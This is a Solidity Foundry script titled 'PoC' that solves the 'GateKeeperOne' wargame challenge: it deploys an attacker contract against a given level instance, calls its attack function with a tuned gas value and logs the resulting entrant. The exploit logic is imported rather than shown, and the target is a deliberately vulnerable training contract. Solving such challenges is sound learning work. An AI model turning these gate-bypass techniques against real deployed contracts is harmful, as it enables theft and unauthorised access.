// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {LockPickingOne} from "../src/13_GateKeeperOne.sol";

interface IGateKeeperOne {
    function entrant() external view returns (address);
}

/**
 * @notice Use the test to find the gas value that will pass the gatekeeper
 */

contract PoC is Script {
    address private immutable gateOne =
        0x3D47f75FdB928E3DC0206DC0Dc3470fF79A43fE2; // Replace with your GateKeeperOne instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        LockPickingOne lockPickingOne = new LockPickingOne(gateOne);
        lockPickingOne.attack(256);

        console2.log("Entrant: ", IGateKeeperOne(gateOne).entrant());

        vm.stopBroadcast();
    }
}
